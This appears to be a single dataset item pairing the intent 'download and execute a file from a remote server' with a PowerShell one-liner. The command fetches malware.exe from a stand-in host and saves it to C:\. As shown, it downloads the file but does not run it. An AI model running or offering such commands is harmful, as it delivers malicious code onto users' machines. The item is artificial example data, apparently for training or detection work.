# Natural language intent:
# Download and execute a file from a remote server

Invoke-Expression -Command '$url = "http://malware.example.com/malware.exe"; Invoke-WebRequest -Uri $url -OutFile "C:\malware.exe";'
